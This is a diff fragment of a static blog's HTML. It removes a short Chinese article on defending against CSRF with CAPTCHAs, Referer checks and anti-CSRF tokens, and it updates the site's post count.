-<h2 id="CSRF-防御技巧"><a href="#CSRF-防御技巧" class="headerlink" title="CSRF 防御技巧"></a>CSRF 防御技巧</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。</p>
-<p>验证码算是对抗CSRF攻击最简洁有效的方法。</p>
-<p>但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码。</p>
-<p>只有一些关键的操作，才能要求输入验证码。</p>
-<p>不过随着HTML5的发展。</p>
-<p>利用canvas标签，前端也能识别验证码的字符，让CSRF生效。</p>
-<h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>Referer Check即来源检测。</p>
-<p>HTTP Referer 是 Request Headers 的一部分，当浏览器向web服务器发出请求的时候，一般会带上Referer，告诉服务器用户从哪个站点链接过来的。</p>
-<p>服务器通过判断请求头中的referer，也能避免CSRF的攻击。</p>
-<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。</p>
-<p>既然知道根本原因，我们就对症下药，利用Token。</p>
-<p>当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。</p>
-<p>Token可以存放在用户浏览器的Cookie中，</p>
-<p>当用户提交表单时带上Token值，服务器就能验证表单和Cookie中的Token是否一致。</p>
-<p>（前提，网站没有XSS漏洞，攻击者不能通过脚本获取用户的Cookie）</p>
-<p>原文地址：<a href="http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html" target="_blank" rel="noopener">http://www.cnblogs.com/alilang/archive/2013/01/29/2880843.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1466,7 +1315,7 @@ background-size: 100px auto;
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-count">82</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
